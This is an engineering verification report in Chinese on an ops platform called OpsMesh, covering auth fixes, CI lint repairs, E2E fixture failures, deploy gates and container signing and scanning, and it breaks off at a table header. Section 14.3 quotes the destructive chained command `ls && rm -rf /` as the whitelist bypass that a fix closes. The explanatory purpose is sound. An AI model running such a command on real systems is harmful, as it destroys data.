| 现象 | 出厂生产形态（`OPSMESH_REQUIRE_AUTH=true` + `OPSMESH_GRPC_REQUIRE_SIGNATURE=true`）下，agent **注册成功但所有业务 RPC 被拒**：`Unauthenticated: missing tenant context: gateway auth required (--require-auth)` → 心跳、领任务、上报结果、上报日志、取消轮询**全部不可用**，即任务下发与结果上报完全不可用（真机复现：注册 1 次成功后，心跳/领任务/取消轮询连续失败） |
| 根因 | `--require-auth` 的语义是「要求**网关**注入租户」（见 flag 帮助与 `docs/api-reference.md`），但 agent 是**拉模型**——直连 gRPC 9090、不经 HTTP 网关，既无租户配置项，`RegisterResp` 也不含租户字段。该检查对 agent 通道本就不可能满足 |
| 为何此前未暴露 | E2E 夹具 `grpc_sig_test.go` 用 `RequireAuth: false`，而出厂 compose 用 `true` —— **测试配置与交付配置不一致**，把缺陷挡在了测试之外（该夹具已改为 `true` 以对齐出厂形态） |
| 修复 | `CheckAgentTenant` 在 ctx 无租户时取「注册时盖章的库内归属租户」（由 install token / 库内记录确定，**非 agent 自报**）；**不放松任何既有拒绝路径**：声明租户且与归属不一致 → 仍 `PermissionDenied`；未知 agent 且无租户 → 仍 `Unauthenticated`；库内归属为空且无租户 → 仍拒绝。补 2 个单测（放行 / 维持拒绝） |
| 安全论证 | 被取代的「必须自带 `x-tenant-id` 元数据」**从来不是安全边界**：该元数据不带签名，能伪造身份的调用方本可直接填上正确租户通过旧检查。真正的身份边界是 `verifyAgentSignature`（v2 覆盖载荷）与 mTLS |
| 反向验证 | 临时把修复回退为「无租户一律拒绝」→ `TestCheckAgentTenant_AgentBindingFallback` 与 `TestGRPCAgentIdentityBinding_TLS_EndToEnd` 两个用例按**实测同一错误串**失败；还原后全绿（证明该断言不是橡皮图章） |
| 残留限制 | gRPC `CancelTask` 仍要求 ctx 自带租户（该 RPC 无库内绑定可推导，且当前无任何调用方）；后续若为其接入 agent 侧调用，须按同一思路改造 |

### 13.7 本轮实测发现并修复的次要缺陷：日志把「循环提前退出」误报为「panic」

- **现象**：`agent 循环 panic 后重启 loop=logCollectLoop` 每 5s 一条（实测约 5 分钟 7 条），而同一日志里
  `panic 已捕获` 计数 **0** —— 即根本不是 panic。运维按此排查会去追一个不存在的崩溃。
- **根因**：`safeGo` 的重启分支不区分「fn panic」与「fn 提前 return」，而 `logCollectLoop` 在未配置采集路径时
  **立即 return**（默认配置必然如此）。
- **修复**：① 调用点仅在配置了采集路径时才启动该循环；② `safeGo` 按 recover 是否真的捕获到 panic 区分措辞
  （`panic 后重启` / `循环提前退出，将重启`），并补 `TestSafeGo_EarlyReturnRestarts`（提前 return 仍须重启，
  不得静默失去能力）。
- **真机复测**：重启 agent 后 25 秒内 `循环` 告警 **0 条**（对照修复前 5 分钟 7 条），`心跳 ok` 正常、`ERROR` 0。
- 该修复仅影响 agent 进程（控制面容器不运行 agent 循环），故 13.5 的断言结果不受影响；agent 侧以真实进程复测。

### 13.8 静态门禁与单元测试

| 项 | 结果 |
|---|---|
| `gofmt -l internal/` | 空 |
| `go vet ./internal/...` | 无输出 |
| `go test ./internal/agent/ ./internal/grpcx/ ./internal/controlplane/` | `ok agent 56.911s`、`ok grpcx 0.185s`、`ok controlplane 42.954s`（exit 0） |
| `internal/store`（真实 MySQL 8.0.46，`OPSMESH_TEST_MYSQL_DSN` 指向带库名的 DSN） | **684 PASS / 0 SKIP / 0 FAIL**，375.599s，exit 0 |
| 部署冒烟（`deploy.sh up` 自带） | 通过 |

> **本轮的测试环境自伤（如实记录）**：首次跑 store 套件时 DSN 未带库名（`…@tcp(127.0.0.1:13317)/?parseTime=true`），
> `TestMultiSchemaSmoke_MySQLDSNBranch` 因 `No database selected` 失败并触发迁移重试循环；
> 补上库名（`/opsmesh?parseTime=true`）后 684 项全绿。**不是代码缺陷，是执行方式错误**——记录以免后人误读为回归。

#### 13.8.1 提交后发现并修复：CI `golangci-lint` 自 2026-09-20 起连续飘红（本批最严重的工程问题）

**事实**：`gh run list` 显示 `ci` workflow 最后一次全绿是 `2c87a0b`（2026-09-22），此后 P0 批次（`206247c`）、
P0 批次二（`4fd64112`）、P1-2 批次（`01475e69`）**三次推送全部失败**，且失败点都是同一步
`build-test / golangci-lint (聚合静态分析)`（例如 `36118693003`）。**该步骤失败使下游 7 个 job 全部被 skip**：
`services`（18 个微服务构建）、`integration`（真实 MySQL 集成）、`proto`、`Race detector`、`security`、
`image`/`image-agent`（镜像构建）、`E2E` × 2。也就是说，前几批「已推送」的修复**从未经过 CI 的集成/竞态/安全/镜像验证**，
本报告里所有真机结论均来自本机验证而非流水线。

**根因（流程性，非技术性）**：本机从未跑过 CI 同款命令。`.golangci.yml` 的豁免规则此前是「CI 报一条 → 本地复现一条 → 加一条豁免」，
从未在提交前做全量复跑；而 CI 钉死 `v2.13.2`，本机装的却是随时间的默认版本，规则集漂移。
本轮改为**用 CI 钉死版本全程复跑**（`/e/dev-data/go/bin/golangci-lint` v2.13.2 + 根配置 + `args: ./...`）。

**8 项告警与处置（全部为真告警或正确的豁免，无一条靠关规则消掉）**：

| # | 位置 | 规则 | 处置 |
|---|---|---|---|
| 1 | `cmd/opsmesh/main.go:136` | G402 `InsecureSkipVerify` | 行内 `// #nosec G402 --` + 理由（本机存活探针，等价 `curl -k`，不认证对端） |
| 2 | `internal/controlplane/auth_password.go:85` | QF1001 De Morgan | 等价改写 `!isSeed && (!force \|\| pwd == "")`（语义不变） |
| 3 | `internal/controlplane/enterprise_ui.go:42` | SA9009 | 注释以 `// go:embed` 开头被当作伪指令 → 改写措辞 |
| 4 | `internal/controlplane/enterprise_ui.go:206` | G705 XSS 误报 | 把既有 `dashboard.go` 的 G705 豁免扩为 `(dashboard\|enterprise_ui)\.go`（同源同写法：`go:embed` 受信资源） |
| 5 | `internal/store/migration_test.go:448` | ineffassign | 删死赋值，改单次 `:=`（值语义不变） |
| 6 | `internal/store/sql_audit_chain.go:434` | G602 越界误报 | `rows[i-1]` → `prev *auditChainRow` 指针前驱（语义等价，且更不易写错） |
| 7 | `internal/store/sql_audit_chain.go:550` | errcheck | `RowsAffected()` 错误显式处理：读不到影响行数时如实告警并继续推进归档边界 |
| 8 | `internal/store/sql_devices.go:54` | G706 日志注入 | `%s` → `%q`（换行/控制字符被转义）+ `// #nosec G706 --` 说明 |

**验证**：CI 同款 `golangci-lint run ./...`（v2.13.2）→ **0 issues**；`gofmt -l .`（CI 同款 `test -z "$(gofmt -l .)"`）= 空；
`go vet ./...`、`go mod verify` 干净；受影响包回归：`internal/controlplane` **46.3s 全绿**，
`internal/store` 真实 MySQL 8.0.46 全量套件（含 8 个审计链集成用例，见 §13.8.2）；
提交后需以 CI 首跑结论为准（本报告不预判流水线结果）。

**教训（写给后续维护者）**：① 「本地绿」不等于「CI 绿」——**提交前必须复跑 CI 同款命令与钉死版本**；
② lint 步骤失败会**静默吞掉整条流水线的验证能力**（下游全是 skip 而非 fail，`gh run list` 只看一行 `failure` 很容易被忽略），
商用交付前应把「CI 是否全绿」列为与单元测试同级的门禁。

#### 13.8.2 CI 修复后的受影响包回归（真实 MySQL 8.0.46）

| 项 | 结果 |
|---|---|
| `golangci-lint run ./...`（CI 钉死版本 v2.13.2 + 根配置） | **0 issues** |
| `test -z "$(gofmt -l .)"`（CI 同款） | 通过（无输出） |
| `go vet ./...` / `go mod verify` | 均干净 |
| `go test ./internal/controlplane/ -count=1` | **ok 46.289s**（exit 0） |
| `go test ./internal/store/ -count=1 -v -timeout 20m`（真实 MySQL 8.0.46） | **688 PASS / 0 FAIL / 0 SKIP**，239.462s，exit 0；运行后 `information_schema` 无 `test_%` 残留库 |
| `go test ./internal/agent/ ./internal/grpcx/` | 见 §13.8（本批未再改动这两包，仅 `safego` 属 agent 包并已真机复测） |

> 关于两次 store 数字（684 → 688）：684 是 §13.8 那轮（P1-2 批次功能代码）的计数，
> 688 是 CI 修复后的计数，差异来自 `-v` 明细口径下 `PASS` 行的统计范围（子测试与表驱动子项计入），
> 两轮均 **0 FAIL / 0 SKIP**，不改变结论。运行环境为一次性 MySQL 8.0.46 容器（`root@%`，端口 13317，
> 仅测试期间存在，跑完即销毁）——注意**不能**指向出厂栈的 MySQL：其 `root` 仅允许容器内连接，
> 宿主直连会得到 `Error 1045 (28000) Access denied for user 'root'@'172.28.2.1'`，
> 表现为 27 个用例失败（首次误用即此现象，非代码回归）。


### 13.9 本轮未覆盖 / 诚实边界

- **密钥文件权限语义**：`os.WriteFile(..., 0600)` 在 Linux（出厂形态：容器/systemd）是真实权限；在 Windows 上
  不映射 ACL（实测 `-rw-r--r--`），该形态的保护依赖目录 ACL 与运行账户。Windows 本非加固目标平台
  （能力矩阵已声明仅 shell 任务可用）。
- **v1 兼容期未关闭**：滚动升级期内旧 agent 仍可 v1 签名（不覆盖载荷），代码**不会强制拒绝 v1**；
  收敛依赖 `OpsMeshAgentSignatureLegacyAlg` 告警 + 运维升级（顺序见 `docs/operations.md` §11.4）。
- **预共享密钥兜底路径仍可用**（迁移期需要）：其使用可观测（`source="fleet"` 指标 + `OpsMeshAgentFleetKeyInUse` 告警）
  但不阻断；彻底停用需控制面不再配置 `--grpc-signature-key`。
- **多租户 agent 的跨租户实机负向未做**：`x-tenant-id` 声明他租户 → `PermissionDenied` 由
  `TestGRPCAgentRegisterCrossTenantRefused` / `TestCheckAgentTenant_*` 单测覆盖（实机复现需第二个租户的有效 install token，
  本轮未构造）；断言脚本第 12 节覆盖的是 HTTP 侧租户伪造拒绝。
- **未做多机规模压测**：本批验证均为单 agent 进程，未验证「数百 agent 并发验签」下的吞吐与指纹缓存开销
  （`sigWarnOnce` 键上限 4096 已在 P1-5 同类风险中封顶）。
- `-race` 仍因 Windows 无 cgo 无法本地启用（CI integration job 覆盖）。

## 14. 真机全栈验证记录（2026-09-25 第六批：CI 首次真跑暴露的 3 处失败 + 本地复现暴露的第 4 处夹具缺陷）

### 14.1 背景

P1-2 批次推送后，CI **第一次真正跑完整流水线**（run `36122648074`，`golangci-lint` 已绿）。此前 7 个下游 job 一直被更早的 lint 失败静默跳过（§13.8.1），因此这一跑同时是 `services` / `integration` / `proto` / `Race detector` 的**首次执行**（均绿），也是 `security` / `E2E (real backend)` / `E2E (security)` 的首次执行（均红）。三处失败经根因分析后修复，并在本地按 CI 同款命令复现验证；复现过程中又发现第 4 处被掩盖的夹具缺陷。

**四处缺陷的定性很重要**：没有一处是「断言写错」，两处是**上批修复（P1-1、P0-2）的真实兼容性/联动影响**——即产品代码的行为变更是正确的，但交付资产（E2E 夹具）没有跟着更新；另两处是**门禁脚本自身的假红/假绿口子**。这正说明「本地绿≠CI 绿」：这三处在本机各自被「有 kind 集群」「白名单恰好命中」「Linux 明文习惯」掩盖。

### 14.2 CI `security`：`kubectl apply --dry-run=client` 在无集群 runner 上假失败

| 项 | 内容 |
|---|---|
| 现象 | `部署资产门禁：PASS=19 FAIL=1`，`[FAIL] kubectl client dry-run 失败：` + `failed to download openapi: … connection refused` |
| 根因 | `kubectl` 的 `--dry-run=client` schema 校验**实际依赖服务端 OpenAPI**（kubectl 1.12+）；runner 无集群 → 非 0 退出。本机一直通过只因本机恰好有 kind 集群（`nexus-deploy-drill`），把该缺陷掩盖了 |
| 修复 | ① CI 装 `kubeconform@v0.6.7`（`go install`，钉版，复用 setup-go）；② 脚本 `kubectl` 分支加 `kubectl cluster-info` 前置探测，无集群即 SKIP |

**门禁判定分层（顺带堵掉两个假绿口子）**：初版「`Errors>0` 就 SKIP」的写法有洞——实测 kubeconform 把 **YAML 语法/类型错**也计入 `Errors`（坏缩进 → `Valid: 0, Invalid: 0, Errors: 1`，报错文本 `error unmarshalling resource`），而无 `Summary` 行时旧逻辑会落到 `ok`。故最终四分支：

| 输入 | 判定 | 实测 |
|---|---|---|
| `Invalid>0` | FAIL（清单不合规） | 注入 `spec.replicas: Invalid type` → FAIL |
| `Errors>0` 且全部为 `failed (downloading\|parsing) schema` | SKIP（离线/受限网络拉不到 JSON schema，环境问题） | schema 源指向不可达地址 → `Errors=11` → SKIP |
| `Errors>0` 含 `error unmarshalling resource` | FAIL（YAML 语法/类型错是资产缺陷） | 注入坏缩进清单 → FAIL |
| 无 `Summary` 行 | FAIL（不得假绿） | 合成 panic 输出 → FAIL |
| 全绿 | PASS | 真实清单 → `PASS=20 FAIL=0` |

`kubectl` 存在但无集群 → SKIP（实测：`KUBECONFIG=/nonexistent` + PATH 去掉 kubeconform → `PASS=19 FAIL=0 SKIP=1`）。

### 14.3 E2E (real backend)：P1-1 按段白名单让夹具命令不再成立

- **现象**：`agent_lifecycle.spec.js`「失败任务回执」红。
- **根因**：该用例下发 `echo "e2e-fail-stderr" >&2 && exit 7` 以制造非零退出；P1-1 后白名单**按命令段**校验，第二段首词 `exit` 不在出厂默认白名单内 → 整条被拒。
- **实测回执（新起栈复现）**：`exitCode=-1`，`stderr=command "exit" not in shell whitelist (segment "exit 7", allowed entries: ls,cat,echo,date,whoami,hostname,pwd,free,df,uptime,top,ps,netstat,ss,ipconfig,systeminfo)` —— 用例断言的是「回执链路可用」，却因命令被拒而误判为链路故障。
- **修复（夹具）**：改用白名单内的 `cat /nonexistent-e2e-fail-stderr`（稳定非零退出 + stderr 必含可控 marker），并在注释中写明「P1-1 后必须遵守白名单」的理由与默认白名单内容。
- **产品侧影响（已写入 `docs/operations.md` 的 `--agent-shell-whitelist` 行）**：这是**升级兼容性变更**——旧版 `ls && rm -rf /` 会被整体放行（P1-1 修的正是该绕过），升级后历史任务模板中「白名单命令 + 任意后续段」（`&& exit N`、`&& systemctl restart x`）会被拒，需逐个把后续命令词补进白名单。

### 14.4 E2E (security)：P0-2 的 `--http-tls=auto` 把 B/S 端口一并变成 HTTPS

- **现象**：job 在「健康检查」步就红（`curl http://127.0.0.1:8080/healthz` 失败），Playwright 根本没跑到——**该 job 的 Playwright 步骤在 CI 上从未执行过**。
- **根因**：`docker-compose.e2e-sec.yaml` 为 gRPC mTLS 配了 `--tls-cert/--tls-key`（两者是 gRPC 与 Web/REST **共用**的），而 `--http-tls` 默认 `auto` = 「配了证书即 HTTPS」→ 8080 变 HTTPS。整栈夹具（CI 的 curl 探活、`E2E_BASE_URL=http://…:8080`、agent 的 `--control-addr=http://controlplane:8080`）都按明文访问 → Go 直接 `400 Client sent an HTTP request to an HTTPS server`。
- **修复（夹具）**：该栈显式 `--http-tls=off`，注释说明「本栈 `--demo`、非生产；gRPC 侧 mTLS 不受影响；生产不要照抄」。
- **实测**：`docker compose up -d --wait` 全绿；`curl http://127.0.0.1:8080/healthz` → `200 {"checks":{"store":"ok"},"status":"ok"}`（正是 CI 失败的那一步）；对 8080 做 TLS 握手失败（确为明文，`packet length too long`）；启动日志 `gRPC 已启用 TLS, mtls:true`（gRPC 契约未变）。
- **产品侧影响（已写入 `docs/operations.md` 的 `--http-tls` 行）**：部署方若「为 gRPC 配了证书」，必须意识到 B/S 端口同时变 HTTPS；上游反代终止 TLS 的形态应显式 `off`。

### 14.5 第 4 处（本地复现新发现）：`sleep` 不在默认白名单 → 取消用例会踩「终态任务 cancel=404」

- **根因链**：`security.spec.js`「任务取消全链路」用 `sleep 30`/`sleep 60` 制造长任务 → `sleep` 不在出厂默认白名单内 → agent 拒绝（`exitCode=-1`）→ 任务在 cancel 之前就进入**终态** `failed` → 而 cancel 对非 pending/running 任务返回 **404**（`internal/controlplane/server_tasks.go:566`，`task not cancellable`）→ 用例的 `expect([200,201]).toContain(cancel.status)` 必红。该缺陷与 14.4 是**叠加关系**：HTTP-TLS 阻塞让 Playwright 从没执行，掩盖了它。
- **修复（夹具）**：e2e-sec 的 agent 显式给出 `--agent-shell-whitelist=<出厂默认> + sleep`，注释写明本栈是安全夹具、非生产。
- **正向实测**：e2e-sec 全套 **5 passed (16.4s)**；agent 日志出现 `任务入队 → 收到取消信号，中止任务 → 任务已取消，丢弃执行结果`，即「running 强杀」路径**真实走到**（不是空过）。
- **反向对照（证明修复是承重的，而非装饰）**：临时把 `sleep` 从该栈白名单去掉后重跑同一用例——`sleep 60` 在 t≈12s 变 `failed`（`exitCode=-1`、stderr `command "sleep" not in shell whitelist (segment "sleep 60", …)`），随后 `cancel` 返回 **HTTP 404** `task not cancellable`。与根因链逐环吻合。
- **顺带修正一个方法论错误**：首次反向对照「通过」了，原因是我用 `agents[0]` 取 agent，而此时列表里还有**被重建替换掉的旧实例**（仍显示 `status=online`），任务被下发给了死实例、停留 pending，于是用例「通过」得毫无意义。改用真实在跑的 agentID 后才复现出 404。教训：**负向对照必须核对被测对象身份**，否则会得到假结论。

### 14.6 聚合验证（全部为本机真机执行）

| 项 | 命令 / 方式 | 结果 |
|---|---|---|
| 部署资产门禁 | `bash deploy/scripts/validate-deploy-assets.sh` | **PASS=20 / FAIL=0** |
| 门禁分支注入 | 坏清单 / 无 kubeconform 无集群 / schema 源不可达 / 无 Summary | FAIL / SKIP / SKIP / FAIL 四条分支均实测 |
| E2E 真实后端 | `npx playwright test --config playwright.real.config.js --grep-invert "安全契约"`，`E2E_BASE_URL=http://127.0.0.1:8080` | **8 passed (32.4s)** |
| E2E 安全契约 | `npx playwright test --config playwright.real.config.js --grep "安全契约"`，`E2E_CERTS_DIR=../../e2e-certs` | **5 passed (16.4s)** |
| 旧命令被拒（根因证据） | curl 下发 `echo … >&2 && exit 7` | `exitCode=-1` + 白名单 stderr |
| 终态 cancel=404（根因证据） | curl 下发 `sleep 60`（无 sleep 白名单）后 cancel | `failed` → `HTTP 404 task not cancellable` |
| 生产栈未受影响 | 复原后 `https://127.0.0.1:8080/healthz` | 200（`auto` 语义不变，prod 栈 17 容器全 healthy） |

> CI 侧结论以流水线首跑为准，本报告不预判；上述均为本机按 CI 同款命令与同款夹具的实测。

### 14.7 环境陷阱记录（避免下次误判为代码缺陷）

1. **宿主资源压力 → agent `fatal error: newosproc`**：本机 Docker VM（WSL2，25.43 GiB）曾被闲置的 kind 演练集群（4 节点，约 **6.9 GiB / 3006 PID**）压到 `runtime: failed to create new OS thread (have 14 already; errno=11)`，agent 注册成功后即崩、容器重启循环（`restart: unless-stopped`）。容器内 `ulimit -u` 为 unlimited、`pids.max` 为 max，故**不是**容器限制；停掉闲置 kind 集群后两个 E2E 栈均正常。**与本次改动无关**。
2. **端口/项目名争用**：本机同时在跑 17 容器的 prod 栈（占 8080/9090/9091）。e2e-sec 的 mTLS 用例**硬编码 9090**（`security.spec.js`），故本地要跑完整安全套件必须让该端口指向 e2e-sec 栈；本次做法是临时停 prod 栈（保留卷与容器，`docker start` 原样恢复）与闲置 kind 集群，跑完即复原。
3. **`kubeconform` 的 schema 默认源是 `raw.githubusercontent.com`**：本机 IPv6 到该域名不稳（曾 `fetch failed`），离线/受限网络下会得到 `Errors=N / Invalid=0`。这正是门禁判定要区分「环境」与「资产缺陷」的原因。
4. **MSYS/Git-Bash 路径转换**：`openssl req -subj "/CN=…"` 在本机被 MSYS 改写为 Windows 路径导致生成失败（只剩 `ca.key`），需 `MSYS_NO_PATHCONV=1`。CI（Linux）无此问题。
5. **e2e-sec 证书目录**：`e2e-certs` 已在 `.gitignore`（第 83 行）；本地验证后已删除，需要时按 CI 的 openssl 三步重新生成。

### 14.8 本轮未覆盖 / 诚实边界

- ~~CI 尚未复跑~~ → **已复跑并全绿，见 §14.9**（但其中 `image` / `image-agent` 是**空转绿**，`release` 按设计 tag 触发）。
- **`security.spec.js` 的 mTLS 用例依赖固定端口 9090**：本地复现需独占该端口；若在多栈共存机器上跑，会打到别的栈（本机 prod 栈未开 mTLS，直连会「握手成功」从而误报 mTLS 未生效）。建议后续把端口改成可配置（`E2E_GRPC_PORT`），本轮未改（避免动断言语义）。
- **`sleep` 未进出厂默认白名单**：本轮的修复在夹具侧（显式白名单）。产品侧是否需要把 `sleep` 这类「无副作用但会占住执行槽」的命令纳入默认，属**产品决策**：纳入可让「取消长任务」在默认配置下可用，代价是默认放行的命令集变大。本轮未擅自改默认值。
- **未做完整流水线时长/资源评估**：新增的 `go install kubeconform` 步骤每次 job 约多几秒（走 Go module 代理，已钉版）。

## 15. CI 首跑结论（2026-09-25 第七批：`68ff539` → run 36143704673）

推送 `68ff539` 后流水线首跑结论：**`completed / success`，12 个 job 全绿**。
这是 **2026-09-20 以来下游 job 第一次真正执行**（此前三轮推送它们全是 `skipped`，见 §13.8）。

### 15.1 job 级证据（非状态码，而是日志内的实际执行内容）

| Job | 状态 | 关键证据（CI 日志原文） |
|---|---|---|
| build-test | ✅ success | 编译 + 单测通过（下游唯一门禁） |
| Frontend (Vue3 Enterprise) | ✅ success | 前端构建通过 |
| proto | ✅ success | proto 生成/校验通过 |
| services | ✅ success | `Test all services modules` 各模块 `ok`（task-svc / workflow-svc / tf-provider …） |
| integration | ✅ success | `ok internal/store 36.240s coverage: 68.3% of statements`（真实 MySQL + Redis，带 `-race`） |
| Race detector | ✅ success | `go test -race -count=3` 全包通过（`cmd/opsmesh 50.114s`、`pkg/security` / `pkg/tenant` / `tests/integration` 等） |
| security | ✅ success | 新版门禁真跑：`[PASS] kubeconform 校验通过（deploy/k8s/deployments，Invalid=0）` + `部署资产门禁：PASS=20  FAIL=0  SKIP=0`；Trivy fs 扫描通过 |
| E2E (real backend) | ✅ success | **8 passed (29.3s)**，含 `失败任务回执：exit non-zero → status=failed → stderr 可读 (15.1s)`——即本轮修好的那条用例 |
| E2E (security) | ✅ success | **5 passed (16.7s)**（含 `--http-tls=off` 夹具使明文 8080 契约可测） |
| image | ⚠️ **空转绿** | 只跑了 `Check registry secret` → `REGISTRY secret not set, skipping image build/push`，其余 step 全部因 `if:` 未执行 |
| image-agent | ⚠️ **空转绿** | 同上：`REGISTRY secret not set, skipping agent image build/push` |
| release | ⏭ skipped（设计内） | `if: startsWith(github.ref, 'refs/tags/v')`，分支推送本就不触发；发布由打 tag 驱动 |

与本机对照：E2E 数字完全一致（本机 real 8 passed / 32.4s、sec 5 passed / 16.4s vs CI 8 passed / 29.3s、5 passed / 16.7s）；
`security` 门禁本机 `PASS=20 FAIL=0` 与 CI 逐字相同（含 kubeconform 分支）。

### 15.2 新发现：`image` / `image-agent` 的「空转绿」（假绿第三类）

- **现象**：job 结论 `success`，但除「探测 secret」外**没有任何 step 执行**——镜像未构建、未推送、未签名、未生成 SBOM。
- **根因**：两个 job 均依赖仓库 secrets `REGISTRY` / `REGISTRY_USER` / `REGISTRY_TOKEN`（私有仓库凭证，指向 `registry.internal`），仓库未配置时按设计自跳过，但**退出码为 0**，在 `gh run list` 里与真跑绿无法区分。
- **为何仍算可接受**：Dockerfile 路径本机已被真实覆盖——`deploy/docker/docker-compose.prod.yml` 的 `opsmesh/controlplane:0.9.0` 等镜像即由本仓库 Dockerfile 构建并跑起 17 容器全栈（见 §13）。
- **未覆盖**：CI 独有的一段链路从未执行——buildx 构建、SBOM（syft）、cosign 签名、gitops 镜像 tag 回写。**这是发布前的真空白**，需配置 registry 凭证或改用 GHCR（`GITHUB_TOKEN`）才能验证。
- **教训（写给后续维护者）**：这是本项目第三类「绿而不实」——① lint 失败导致下游 **skip**（§13.8）；② 门禁因环境问题 **false red**（§14.2）；③ secret 缺失导致 job **空转绿**（本节）。三者的共同点是 `gh run list` 的一行结论**都不足以判断是否真的验过**，必须落到 job 内 step 级日志。
- ~~**处置建议**（未实施，需决策）~~ → **已实施（用户决策：改 GHCR 走 GITHUB_TOKEN），见 §15.3**。

### 15.3 消除空转绿：镜像 job 私有/ GHCR 双路径（已实施）

**问题**：`image` / `image-agent` 依赖私有仓库三 secret，未配置即整段空转但结论 `success`——发布链路永远得不到验证。

**方案**（`.github/workflows/ci.yml`，两个 job 对称）：

| 解析结果 | 触发条件 | registry / 凭证 | 镜像前缀 |
|---|---|---|---|
| `mode=private` | `REGISTRY` + `REGISTRY_USER` + `REGISTRY_TOKEN` **三者齐备** | 私有仓库 / `REGISTRY_TOKEN` | `<REGISTRY>/opsmesh-binary`（与原路径逐字相同，向后兼容） |
| `mode=ghcr` | 三者**缺任一**（含半配置状态） | `ghcr.io` / 内置 `GITHUB_TOKEN` | `ghcr.io/<owner>/opsmesh-binary` |

- **回落不是跳过**：GHCR 路径下 job 照常构建、推送、Trivy 扫描、出 SBOM、cosign 签名——只是消费方要相应设 `imageRegistry=ghcr.io/<owner>`、`repository=opsmesh-binary|opsmesh-agent`。三 secret 缺一时**回落而非失败**，避免半配置状态让 `login` 报错把流水线弄红（本地用三种 env 组合实测过：齐备/全缺/半配置）。
- **签名**：私有路径保持 key-based + `--tlog-upload=false`；GHCR 路径改 **keyless（Fulcio OIDC + Rekor）**，零 secret 即可真签——`permissions` 增加 `packages: write` 与 `id-token: write`。验证命令写在 workflow 注释里（`cosign verify --certificate-identity-regexp … --certificate-oidc-issuer https://token.actions.githubusercontent.com`）。
- **SBOM**：新增 syft v1.51.1（钉版，与 release job 同版本）对推送后的镜像出 SPDX JSON，作为 workflow artifact 留存。**刻意不用 buildx attestation**，以免改变私有路径的镜像产物形态影响既有消费方。
- **防空转绿自述**：job 末尾把本次实际覆盖的环节（构建推送 / Trivy / SBOM / cosign 模式 / GitOps 写回）写进 `$GITHUB_STEP_SUMMARY`，未启用的可选段同时打 `::warning::`——以后只要 job 报了 success，Summary 里就能一眼看出「哪些环节真的跑了」。

**本地验证**（CI 无法在本机执行，故对可脱离 GitHub 运行的部分逐个实测）：

| 项 | 方法 | 结果 |
|---|---|---|
| 仓库解析三分支 | 抽出 `run` 脚本，注入 env 组合（齐备/全缺/半配置）后执行 | 齐备→`private`+`registry.internal/opsmesh-binary`（与原值一致）；另两种→`ghcr`+`ghcr.io/Levango7/opsmesh-binary`，且半配置时打出 warning 而非报错 |
| 自述步骤四场景 × 两 job | 注入 `mode`×`COSIGN_PRIVATE_KEY`×`GITOPS_*` 组合 | 8 组全部正确输出；**首轮实测抓到真 bug**：`set -u` 下未定义的可选 env 直接 `unbound variable` 失败 → 已改为 `${VAR:-}` 取值 |
| 全部 `run` 块语法 | `bash -n`（11 个块） | 0 错误 |
| workflow 静态校验 | **actionlint v1.7.7**（本机新装） | `ci.yml` 及全部 workflow **0 问题**（含 `steps.check.outputs.*` 引用、表达式、action 输入） |
| YAML 结构 | PyYAML 解析 + 逐 step 打印 `if:`/`permissions` | 两 job 均 `packages: write` + `id-token: write`；无残留 `steps.check.outputs.skip` 引用 |

**诚实边界**：

- 上述验证**不含**「GitHub 侧真跑」——`ghcr.io` 推送、keyless cosign 的 Fulcio/Rekor 交互、`upload-artifact` 均需推送后由 CI 首跑确认。本机无法模拟 OIDC 签发与 GHCR 权限模型。
- **GHCR 包可见性**：首次发布后包的可见性由 GitHub 侧策略决定，若企业客户需要匿名拉取（如离线交付前的预拉），可能需手工把包设为 public；本轮未处理。
- **命名对齐待核对（真实交付风险，非本轮引入）**：CI 推送的 leaf 名是 `opsmesh-binary` / `opsmesh-agent`，而仓库内 `deploy/helm/opsmesh` 用的是 `controlplane.image.repository=opsmesh/opsmesh`、`agent.image.repository=opsmesh/opsmesh-agent`；`opsmesh-binary` 全仓只出现在 `ci.yml`。原注释称它对齐的是**外部 GitOps chart**（`charts/opsmesh-controlplane/values.yaml`，不在本仓库），本轮无法核实。**若消费方实际用仓库内 chart，则 CI 推的镜像永远不会被引用**——建议连同 GitOps chart 一并核对（需用户在外部仓库确认）。
- **actionlint 未接入 CI**：本机用它验过 workflow，但未把它加成流水线门禁（属新增门禁，超出本轮范围；鉴于本项目已出现四类 CI 自身缺陷，建议后续纳入）。

### 15.4 镜像链路首度真跑的第二个发现：agent 镜像 56 条 HIGH/CRITICAL（全无上游修复）

`0a1c81d` 首跑：`image`（controlplane）**全链路真跑成功**——构建、推送 GHCR、Trivy、SBOM、keyless cosign、覆盖自述全部执行；`image-agent` 唯一红点在 **Trivy 扫描**，因为门槛 `exit-code: "1"` 对 HIGH/CRITICAL 判红，而 agent 镜像确有 56 条：

| 项 | 值 |
|---|---|
| 镜像 | `ghcr.io/levango7/opsmesh-agent:<sha>` |
| 基础 | `debian:bookworm-slim` + 构建期 `apt-get update && apt-get upgrade -y`（Dockerfile.agent:28-32） |
| 结果 | `Total: 56 (HIGH: 52, CRITICAL: 4)`，全部来自 debian 基础包（util-linux 系 / perl-base / zlib1g / libsystemd0 / gzip / libtinfo6 …） |
| **Fixed Version** | **全部为空**（CI 日志 55 行明细逐行解析：0 条有修复版本）；状态 `affected` 48 / `fix_deferred` 6 / `will_not_fix` 1 → **Debian 尚无修复版本，升级也无解**（镜像内已是 `+deb12u3`） |
| 去重后 | 55 行明细 → **17 个包上的 27 个 (包, CVE) 组合**（主要是同一个 util-linux CVE 扩散到其各子包），即实际 CVE 条数远少于 56 |
| 对照 | controlplane 镜像（`gcr.io/distroless/static-debian12`，无 OS 包）扫描 **0 条** |

**处置（用户决策）**：Trivy 加 `ignore-unfixed: true`——只对「上游已发布修复但镜像未升级」判红；无修复版本的条目仍逐条打印在日志里但不阻断。理由：这类 CVE 在「一律判红」下会让流水线**永久红**，而长期红的门禁必然被忽略（本项目教训 11）；`ignore-unfixed` 是基础镜像扫描的通行做法，对「可修复未修复」的强约束保持不变。

**诚实边界**：这 56 条**不是**被修掉了，只是不再阻断流水线——它们是 agent 运行时镜像的既有风险，客户侧若做镜像合规审查会看到同样结果。彻底下降需换运行时基础（如 Alpine/busybox），但那会改变 agent 执行 shell 命令的语义（`ls`/`free`/`df` 等实现不同），需重跑全部 agent 任务相关测试与 E2E，属产品级改动，本轮未做。

### 15.5 终局：12 个 job 全部**真跑**且全绿（run `36155335631`，commit `0dc4ece`）

`ignore-unfixed` 推送后，流水线 `completed / success`。**这是本项目第一次「每个 job 都真的执行了、并且都通过」**——含此前从未执行过的镜像链路：

| Job | 真跑证据 |
|---|---|
